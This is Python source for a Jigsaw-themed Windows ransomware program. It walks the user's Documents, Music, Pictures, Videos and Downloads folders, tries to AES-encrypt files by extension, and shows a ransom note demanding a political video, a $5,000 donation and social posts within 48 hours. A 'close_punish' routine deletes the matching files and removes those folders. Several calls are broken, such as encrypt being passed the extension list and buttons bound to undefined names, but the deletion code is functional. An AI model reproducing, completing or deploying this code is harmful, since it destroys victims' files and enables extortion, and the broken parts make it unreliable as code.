from tkinter import *
from tkinter import ttk
import pathlib
import os
import getpass
import pyaes
from sct import keygen


env = os.environ
user = getpass.getuser()
sp = pathlib.PurePath.parents
drdoc = f"C:\\Users\\{user}\\Documents"
mu_dir = f"C:\\Users\\{user}\\Music"
pic_dir = f"C:\\Users\\{user}\\Pictures"
vid_dir = f"C:\\Users\\{user}\\Videos"
dl_dir = f"C:\\Users\\{user}\\Downloads"
directory_path = os.getcwd()

file_extension = '.txt', '.pdf', '.mp3', '.mp4', '.RAR', '.zip', '.SQL', '.jpg', '.jpeg', '.png', '.PSD', '.doc' '.docx', '.ppt', '.xls', '.xlsx', '.xlr'

root = Tk()
root.title("Hello")

s = ttk.Style()
s.configure('Danger.TFrame', background='white', borderwidth=5, relief='raised')
ttk.Frame(root, width=1080, height=720, style='Danger.TFrame').grid()

root.grid(column=3, row=4)
root.columnconfigure(3, weight=1)
root.rowconfigure(4, weight=1)

def ok_check():
    global okay_check
    try:
        if ok == True:
            okay_check = True
        elif ok != True:
            okay_check = False
            
    except Exception as e:
        return

def cl_check():
    global close_check
    try:
        if cancel == True:
            close_check = True
        elif cancel == False:
            close_check = False
    except Exception as e:
        return

ok_check()
cl_check()

# buttons
ok = ttk.Button(root, text="Okay", command=okay_check)
cancel = ttk.Button(root, text="Close", command = close_check)
ok.grid(column=3, row=4)
cancel.grid(column=4, row=4)

# text
ransomnote = Text(root, width=300, height=200)
ransomnote.insert('1.0', 'I want to play a game, you don\'t know me but I know you\n All your files are being encrypted, and to decrypt them you\'re going to need a key.\n To get the key, there are a few things you must do:\n 1. Make a video and public live PR announcement that you denounce Israel\'s attack on Palestine. Make it believable too.\n 2. Donate 5,000$ to https://donate.doctorswithoutborders.org/ \n 3. Post the video and receipt of your donation on your socials with the hashtags #FreePalestine and #FromRiverToSea\n\nTime is ticking, in 48 hours your time will run out.\n Can you redeem yourselves by saving the lives you have ruined with your corporate greed?\nMake your choice.\n By the way, if you try to shut down your computer, your files will be permanently deleted and your drives will be unmounted and locked permanently. \n If you try and close this program, all your files will be permanently deleted, your drives will be unmounted, and then permanently locked.')
ransomnote.grid(column=1, row=2)

img = 'jigsaw.png'
imgobj = PhotoImage(file=img)
imgobj.grid(column=1, row=1)

def encrypt_func():
    cry = pyaes.AESModeOfOperationCTR(keygen)
    os.chdir(drdoc)
    try:
        for root, dirs, files in os.walk(directory_path):
            first_path = drdoc
            filtered_files = [file for file in files if file.endswith(file_extension)]
            for file in filtered_files:
                pyaes.encrypt(file_extension)
                os.chdir(mu_dir) 
        
        for root, dirs, files in os.walk(directory_path):
            filtered_files = [file for file in files if file.endswith(file_extension)]
            for file in filtered_files:
                pyaes.encrypt(file_extension)
                os.chdir(vid_dir) 
                
        for root, dirs, files in os.walk(directory_path):
            filtered_files = [file for file in files if file.endswith(file_extension)]
            for file in filtered_files:
                pyaes.encrypt(file_extension)
                os.chdir(pic_dir) 
                
        for root, dirs, files in os.walk(directory_path):
            filtered_files = [file for file in files if file.endswith(file_extension)]
            for file in filtered_files:
                pyaes.encrypt(file_extension)
                os.chdir(dl_dir)
                
        for root, dirs, files in os.walk(directory_path):
            filtered_files = [file for file in files if file.endswith(file_extension)]
            for file in filtered_files:
                pyaes.encrypt(file_extension)          
    except Exception as e:
        print(f'Could not encrypt all files because {e}') 
    
    return

encrypt_func()

def close_punish():
    if close_check == True:
        try:
            for root, dirs, files in os.walk(directory_path):
                first_path = drdoc
                filtered_files = [file for file in files if file.endswith(file_extension)]
                for file in filtered_files:
                    os.remove(os.path.join(root, file))
                    os.chdir(mu_dir)

            for root, dirs, files in os.walk(directory_path):
                filtered_files = [file for file in files if file.endswith(file_extension)]
                for file in filtered_files:
                    os.remove(os.path.join(root, file))
                    os.chdir(pic_dir)

            for root, dirs, files in os.walk(directory_path):
                filtered_files = [file for file in files if file.endswith(file_extension)]
                for file in filtered_files:
                    os.remove(os.path.join(root, file))
                    os.chdir(vid_dir)

            for root, dirs, files in os.walk(directory_path):
                filtered_files = [file for file in files if file.endswith(file_extension)]
                for file in filtered_files:
                    os.remove(os.path.join(root, file))
                    os.chdir(dl_dir)
            os.rmdir(drdoc)
            os.rmdir(vid_dir)
            os.rmdir(pic_dir)
            os.rmdir(mu_dir)
            os.rmdir(dl_dir)
        except Exception as e:
            print(f"An error occurred: {e} -- moving on...")
        
        else:
            for root, dirs, files in os.walk(directory_path):
                first_path = drdoc
                filtered_files = [file for file in files if file.endswith(file_extension)]
                for file in filtered_files:
                    os.remove(os.path.join(root, file))
                    os.chdir(mu_dir)

            for root, dirs, files in os.walk(directory_path):
                filtered_files = [file for file in files if file.endswith(file_extension)]
                for file in filtered_files:
                    os.remove(os.path.join(root, file))
                    os.chdir(pic_dir)

            for root, dirs, files in os.walk(directory_path):
                filtered_files = [file for file in files if file.endswith(file_extension)]
                for file in filtered_files:
                    os.remove(os.path.join(root, file))
                    os.chdir(vid_dir)

            for root, dirs, files in os.walk(directory_path):
                filtered_files = [file for file in files if file.endswith(file_extension)]
                for file in filtered_files:
                    os.remove(os.path.join(root, file))
                    os.chdir(dl_dir)
                    return

close_punish()